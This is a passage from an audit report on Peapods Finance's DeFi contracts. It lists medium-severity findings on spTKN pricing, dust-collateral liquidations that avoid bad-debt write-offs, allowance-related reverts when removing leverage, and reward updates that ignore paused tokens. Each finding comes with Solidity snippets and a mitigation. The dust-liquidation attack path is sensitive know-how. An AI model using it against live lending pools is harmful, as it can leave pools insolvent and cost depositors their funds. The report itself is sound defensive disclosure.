        (uint112 _reserve0, uint112 _reserve1) = V2_RESERVES.getReserves(_lpTkn);
        uint256 _k = uint256(_reserve0) * _reserve1;
        uint256 _avgTotalPeasInLpX96 = _sqrt(_pricePPeasNumX96 * _k) * 2 ** (96 / 2);

        _factor = (_avgTotalPeasInLpX96 * 2) / IERC20(_lpTkn).totalSupply();
        _denomenator = FixedPoint96.Q96;
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Pricing of spTKN would be incorrect, leading to incorrect amount of VotingPool shares minted to users.

### PoC

N/A

### Mitigation

Fix the formula.

# Issue M-32: Malicious liquidator can intentionally leave dust amount of collateral and won't trigger bad debt handling 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/500 

## Found by 
TessKimy, pkqs90

### Summary

Malicious liquidator can intentionally leave dust amount of collateral and won't trigger bad debt handling

### Root Cause

The root cause of issue is in [FraxlendPairCore contract](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/fraxlend/src/contracts/FraxlendPair.sol#L422C1-L423C9), `_newMinCollateralRequiredOnDirtyLiquidation` variable's setter function is commented and now it's equal to 0 by default. 

In Fraxlend, this value is used for protecting the position to leave dust amount of collateral while it has still debt on it. Liquidators are incentivized by liquidator fee and they get extra collateral bonus for liquidation. But if there is dust amount of collateral left, no one will liquidate this position to earn dust amount of collateral and the position won't trigger bad debt handling. 

```solidity
            if (_leftoverCollateral <= 0) {
                // Determine if we need to adjust any shares
                _sharesToAdjust = _borrowerShares - _sharesToLiquidate;
                if (_sharesToAdjust > 0) {
                    // Write off bad debt
                    _amountToAdjust = (_totalBorrow.toAmount(_sharesToAdjust, false)).toUint128(); 

                    // Note: Ensure this memory struct will be passed to _repayAsset for write to state
                    _totalBorrow.amount -= _amountToAdjust;

                    // Effects: write to state
                    totalAsset.amount -= _amountToAdjust;
                }
            } else if (_leftoverCollateral < minCollateralRequiredOnDirtyLiquidation.toInt256()) { 
                revert BadDirtyLiquidation();
            }
```

In conclusion, this kind of positions won't trigger the bad debt handling in the pool.


### Internal Pre-conditions

1. Bad debt condition is required in the position

### External Pre-conditions

No need

### Attack Path

1. Malicious liquidator will liquidate the position by leaving 1 wei of collateral and the bad debt mechanism won't be triggered

### Impact

Position won't be triggered by the liquidators and it will cause insolvency in the pool because withdraw actions will withdraw more assets than it should, the last person who has shares on the pair may lose all of his funds.

### PoC

_No response_

### Mitigation

Choose a reasonable value for `_newMinCollateralRequiredOnDirtyLiquidation` and do not allow liquidators to leave the position's collateral below that value.

# Issue M-33: Transaction may revert unexpectedly due to missing allowance for the lending pair asset 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/504 

## Found by 
TessKimy, X77, pkqs90

### Summary

Transaction may revert unexpectedly due to missing allowance for the lending pair asset

### Root Cause

In [Leverage Manager](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L166C1-L182C88), remove leverage function firstly updates the interest rate of the lending for proper calculation of repay asset. 

```solidity
&>      IFraxlendPair(_lendingPair).addInterest(false);

        // if additional fees required for flash source, handle that here
        _processExtraFlashLoanPayment(_positionId, _sender);

        address _borrowTkn = _getBorrowTknForPod(_positionId);

        // needed to repay flash loaned asset in lending pair
        // before removing collateral and unwinding
&>      IERC20(_borrowTkn).safeIncreaseAllowance(_lendingPair, _borrowAssetAmt);

        LeverageFlashProps memory _props;
        _props.method = FlashCallbackMethod.REMOVE;
        _props.positionId = _positionId;
        _props.owner = _owner;
        bytes memory _additionalInfo = abi.encode(
&>          IFraxlendPair(_lendingPair).totalBorrow().toShares(_borrowAssetAmt, false),
```

The problem is `addInterest` function doesn't guarantee interest update because it only updates the interest if utilization rate change threshold is exceed. But in `repayAsset` function it guarantees interest accrual and the calculations for the share amount will be different than actual.

```solidity
        LeveragePositionProps memory _posProps = positionProps[_props.positionId];

        // allowance increases for _borrowAssetAmt prior to flash loaning asset
&>      IFraxlendPair(_posProps.lendingPair).repayAsset(_borrowSharesToRepay, _posProps.custodian);
```

The `repayAsset` call will revert due to missing allowance because after interest accrual `_borrowSharesToRepay` value will require more assets than calculated.


### Internal Pre-conditions

1. Utilization rate change shouldn't exceed the threshold while repayment process

### External Pre-conditions

No need

### Attack Path

1. User is close to liquidation threshold and he wants to reduce leverage for safety
2. He calls remove leverage function but it reverts due to issue
3. User is liquidated because of price fluctation

### Impact

Remove leverage is time-sensitive function because it saves the position from liquidation point and it increases the health of the position. This is why it has to work as expected. In given scenario, user can be liquidated due to unexpected revert in repayment process.

### PoC

_No response_

### Mitigation

Instead calculate the share amount using preview interest method

# Issue M-34: Improper Handling of Paused Tokens in `TokenRewards._resetExcluded()` Function 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/517 

## Found by 
0xAadi, X77, ZoA, cu5t0mPe0, fibonacci, pkqs90, prosper, queen, silver\_eth

## Summary
The function `_resetExcluded` in `TokenRewards` contract does not properly handle tokens that have been paused in the `REWARDS_WHITELISTER`. As a result, the excluded rewards for paused tokens may still be updated, which can lead to inconsistent or incorrect reward calculations for stakers.

## Vulnerability Detail
In the `_resetExcluded` function, there is a loop that iterates over all rewards tokens. Inside the loop, the function checks if each reward token has been paused by the `REWARDS_WHITELISTER`. However, the logic fails to take into account the paused state of tokens. Specifically, the `REWARDS_WHITELISTER.paused(_token)` check is not used to skip the update of the excluded rewards for tokens that are paused.

Here is the problematic code:

```solidity
for (uint256 _i; _i < _allRewardsTokens.length; _i++) {
@>  address _token = _allRewardsTokens[_i]; // @audit REWARDS_WHITELISTER paused not considered
    rewards[_token][_wallet].excluded = _cumulativeRewards(_token, shares[_wallet], true);
}
```
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L258C5-L263C6

In this loop, the function attempts to update the excluded rewards for each token, but it does not consider whether the token has been paused. If a token is paused, the excluded reward calculation should be skipped to avoid improper reward distribution.

## Impact
-	Inaccurate reward distribution: If paused tokens are not properly handled, users could receive incorrect reward amounts, either by having their excluded rewards incorrectly updated or by missing out on rewards for paused tokens while performing [`setShares()`](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L97).

## Code Snippet
https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/TokenRewards.sol#L258C5-L263C6

## Tool used 
Manual Review

## Recommendation
-	Add the check for paused tokens in the loop to prevent updating rewards for paused tokens.
-	Modify the _resetExcluded function to respect the paused state of tokens as follows:
```diff
for (uint256 _i; _i < _allRewardsTokens.length; _i++) {
    address _token = _allRewardsTokens[_i];
+   if (REWARDS_WHITELISTER.paused(_token)) {
+       continue;  // Skip paused tokens
+   }
    rewards[_token][_wallet].excluded = _cumulativeRewards(_token, shares[_wallet], true);
}
```

